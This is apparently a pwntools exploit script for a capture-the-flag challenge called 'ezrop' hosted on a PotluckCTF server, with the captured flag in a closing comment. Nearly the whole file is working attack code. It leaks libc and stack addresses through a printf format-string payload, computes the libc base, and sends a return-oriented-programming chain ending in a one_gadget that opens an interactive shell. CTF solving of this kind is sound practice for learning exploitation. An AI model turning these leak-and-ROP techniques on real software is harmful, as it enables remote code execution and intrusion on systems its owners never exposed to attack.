#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --port 31337 --host challenge19.play.potluckctf.com
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
context.log_level = logging.DEBUG
context.terminal = ['tmux', 'splitw', '-h']
exe = './ezrop_patched'

libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'challenge19.play.potluckctf.com'
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw, env={'LD_PRELOAD':'./libc.so.6'})
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b gets
# b *vuln+51
continue
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

pop_rbp = 0x000000000040115d
gets = 0x401070
printf = 0x401060
printf_got = 0x404018
main = 0x40120f
sh = 0x404f00


tmp_buf = printf_got 

io = start()

p = fit({
    0: b'%p'*0x10,
    0x20: sh+0x20,
    0x28: p64(0x4011ee) + p64(main)
})

# p += p64(gets) + p64(main)

io.sendlineafter(b'name: ', p)

# libc
io.recv(2*4)

"""
leak = 0x7fea98c19aa0
base = 0x7fea98a00000

offfset = 0x219aa0 
"""

leak = int(io.recv(12), 16)
base = leak - 0x219aa0
info(f'libc base: {hex(base)}')

libc.address = base

# stack
io.recv(8*9)

"""
leak = 0x7ffea27f6f38
base = 0x7ffea27d7000

offset = 0x1ff38
"""

stack_leak = int(io.recv(12), 16)
info(f'stack leak: {hex(stack_leak)}')

# ret to a one_gadget

"""
libc
0x000000000002a3e5 : pop rdi ; ret
0x0000000000035732 : pop rsp ; ret
0x000000000002be51 : pop rsi ; ret
0x0000000000090529 : pop rdx ; pop rbx ; ret
"""

pop_rdi = 0x000000000002a3e5 
pop_rsi = 0x000000000002be51
pop_rdx = 0x0000000000090529
pop_rsp = 0x0000000000035732
one_gadget = 0xebcf8


io.sendline(p64(stack_leak)*0x5 + p64(libc.address + pop_rsi) + p64(0) + p64(libc.address + pop_rdx) + p64(0) + p64(0) + p64(libc.address + one_gadget))
io.interactive()

# potluck{fba7f22d5125950fe906d152df039a5a}
